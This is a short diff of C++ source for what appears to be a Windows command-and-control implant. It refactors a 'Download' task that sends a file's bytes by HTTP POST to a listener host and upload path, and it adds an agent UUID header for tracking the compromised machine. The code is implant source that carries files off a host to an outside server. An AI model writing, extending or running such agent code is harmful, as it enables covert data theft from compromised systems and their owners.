@@ -2,7 +2,7 @@
 
 namespace Task
 {
-    std::wstring Download(HINTERNET hConnect, const std::wstring& wSrc, const std::wstring& wDest)
+    std::wstring Download(State::StateManager& sm, const std::wstring& wSrc, const std::wstring& wDest)
     {
         std::wstring wHeaders;
         System::Http::WinHttpResponse resp;
@@ -12,13 +12,13 @@ namespace Task
 
         // Set additional headers.
         // Specify the destination file path in the server-side.
-        wHeaders = L"X-FILE: " + wDest;
+        wHeaders = L"X-UUID: " + sm.GetUUID() + L"\r\n" +  L"X-FILE: " + wDest + L"\r\n";
 
         resp = System::Http::SendRequest(
-            hConnect,
-            LISTENER_HOST_W,
-            LISTENER_PORT,
-            REQUEST_PATH_UPLOAD_W,
+            sm.GetHConnect(),
+            sm.GetListenerHost(),
+            sm.GetListenerPort(),
+            sm.GetReqPathUpload(),
             L"POST",
             wHeaders.c_str(),
             (LPVOID)byteData.data(),
